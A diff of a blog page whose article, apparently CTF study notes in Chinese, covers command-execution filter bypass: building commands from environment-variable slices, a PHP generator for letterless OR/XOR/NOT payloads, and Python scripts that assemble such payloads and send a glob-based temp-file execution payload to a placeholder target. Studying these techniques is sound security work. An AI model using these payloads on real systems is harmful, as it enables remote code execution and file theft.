@@ -29,7 +29,10 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="outlaws's blog" type="application/atom+xml">
+</head>
 
 
 
@@ -234,7 +237,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/outlaws-bai/outlaws-bai.github.io" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -291,7 +294,7 @@
     }
 </style>
 
-<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/outlaws-bai/outlaws-bai.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -471,13 +474,133 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1-利用系统变量"><a href="#1-利用系统变量" class="headerlink" title="1.利用系统变量"></a>1.利用系统变量</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">命令执行，且题目过滤了小写字母</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$PATH</span>=环境变量，<span class="variable">$PWD</span>=当前目录变量,<span class="variable">$SHLVL</span>=1，<span class="variable">$PHP_VERSION</span>=php版本，<span class="variable">$RANDOM</span>=1000-100000内的数字</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$&#123;?&#125;</span>=上次命令的执行结果，<span class="variable">$&#123;#?&#125;</span>=上次命令的执行结果的长度</span></span><br><span class="line"><span class="meta">#</span><span class="bash">还有一个<span class="variable">$USER</span>,<span class="variable">$TERM</span>,<span class="variable">$HOSTNAME</span>等</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$&#123;#RANDOM&#125;</span>,获取RANDOM生成的随机数的位数。即<span class="comment">#的用途是获取$&#123;RANDOM&#125;执行后结果的长度</span></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">利用的是shell的格式化字符串</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="variable">$&#123;PATH:5:1&#125;</span>，即读取环境变量的第五位字符；<span class="variable">$&#123;PATH:~A&#125;</span>，即读取环境变量的最后一位字符</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH:5:1&#125;<span class="variable">$&#123;PATH:2:1&#125;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">如果当前目录是/var/www/html,下面命令为:nl<span class="variable">$&#123;IFS&#125;</span>????.???</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;PATH:~A&#125;<span class="variable">$&#123;PWD:~A&#125;</span><span class="variable">$&#123;IFS&#125;</span>????.???</span></span><br></pre></td></tr></table></figure>
+                <h2 id="1-利用系统变量"><a href="#1-利用系统变量" class="headerlink" title="1.利用系统变量"></a>1.利用系统变量</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#命令执行，且题目过滤了小写字母
+#$PATH=环境变量，$PWD=当前目录变量,$SHLVL=1，$PHP_VERSION=php版本，$RANDOM=1000-100000内的数字
+#${?}=上次命令的执行结果，${#?}=上次命令的执行结果的长度
+#还有一个$USER,$TERM,$HOSTNAME等
+#${#RANDOM},获取RANDOM生成的随机数的位数。即#的用途是获取${RANDOM}执行后结果的长度
 
-<h2 id="2-无字母数字getshell"><a href="#2-无字母数字getshell" class="headerlink" title="2.无字母数字getshell"></a>2.无字母数字getshell</h2><h3 id="2-1-利用取反、异或、或操作制造不可见字符"><a href="#2-1-利用取反、异或、或操作制造不可见字符" class="headerlink" title="2.1.利用取反、异或、或操作制造不可见字符"></a>2.1.利用取反、异或、或操作制造不可见字符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Y4tacker</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-21 20:31:22</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">orRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (urldecode(<span class="variable">$par1</span>)|urldecode(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//异或</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xorRce</span>(<span class="params"><span class="variable">$par1</span>, <span class="variable">$par2</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = (urldecode(<span class="variable">$par1</span>)^urldecode(<span class="variable">$par2</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//取反</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">negateRce</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$system</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">    fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mode=1代表或，2代表异或，3代表取反</span></span><br><span class="line"><span class="comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">generate</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$preg</span>=<span class="string">&#x27;/[0-9]/i&#x27;</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$mode</span>!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="variable">$myfile</span> = fopen(<span class="string">&quot;rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">        <span class="variable">$contents</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">256</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">256</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = <span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_i</span> = dechex(<span class="variable">$i</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = <span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$hex_j</span> = dechex(<span class="variable">$j</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$par1</span> = <span class="string">&quot;%&quot;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">                    <span class="variable">$par2</span> = <span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">                    <span class="variable">$res</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = orRce(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$mode</span>==<span class="number">2</span>)&#123;</span><br><span class="line">                        <span class="variable">$res</span> = xorRce(<span class="variable">$par1</span>, <span class="variable">$par2</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (ord(<span class="variable">$res</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$res</span>)&lt;=<span class="number">126</span>)&#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$res</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par1</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$par2</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">        fclose(<span class="variable">$myfile</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        negateRce();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">generate(<span class="number">3</span>,<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>);</span><br></pre></td></tr></table></figure>
+#利用的是shell的格式化字符串
+#${PATH:5:1}，即读取环境变量的第五位字符；${PATH:~A}，即读取环境变量的最后一位字符
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+#ls
+${PATH:5:1}${PATH:2:1}
+#如果当前目录是/var/www/html,下面命令为:nl${IFS}????.???
+${PATH:~A}${PWD:~A}${IFS}????.???<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h3 id="2-2-上传临时文件"><a href="#2-2-上传临时文件" class="headerlink" title="2.2.上传临时文件"></a>2.2.上传临时文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#author yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://xxx/test.php?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;cat f*&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br></pre></td></tr></table></figure>
+<h2 id="2-无字母数字getshell"><a href="#2-无字母数字getshell" class="headerlink" title="2.无字母数字getshell"></a>2.无字母数字getshell</h2><h3 id="2-1-利用取反、异或、或操作制造不可见字符"><a href="#2-1-利用取反、异或、或操作制造不可见字符" class="headerlink" title="2.1.利用取反、异或、或操作制造不可见字符"></a>2.1.利用取反、异或、或操作制造不可见字符</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token comment">/*
+# -*- coding: utf-8 -*-
+# @Author: Y4tacker
+# @Date:   2020-11-21 20:31:22
+*/</span>
+<span class="token comment">//或</span>
+<span class="token keyword">function</span> <span class="token function-definition function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">//异或</span>
+<span class="token keyword">function</span> <span class="token function-definition function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">//取反</span>
+<span class="token keyword">function</span> <span class="token function-definition function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your function: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$system</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token constant">STDOUT</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'[+]your command: '</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token variable">$command</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\r"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token constant">STDIN</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'[*] (~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$system</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">')(~'</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">');'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">//mode=1代表或，2代表异或，3代表取反</span>
+<span class="token comment">//取反的话，就没必要生成字符去跑了，因为本来就是不可见字符，直接绕过正则表达式</span>
+<span class="token keyword">function</span> <span class="token function-definition function">generate</span><span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token punctuation">,</span> <span class="token variable">$preg</span><span class="token operator">=</span><span class="token string single-quoted-string">'/[0-9]/i'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">!=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span><span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                    <span class="token variable">$hex_i</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                    <span class="token variable">$hex_j</span> <span class="token operator">=</span> <span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span>
+                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>
+                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>
+                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+
+                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+                        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par1</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
+                    <span class="token punctuation">}</span>
+                <span class="token punctuation">}</span>
+            <span class="token punctuation">}</span>
+
+        <span class="token punctuation">}</span>
+        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
+        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+
+<span class="token punctuation">}</span>
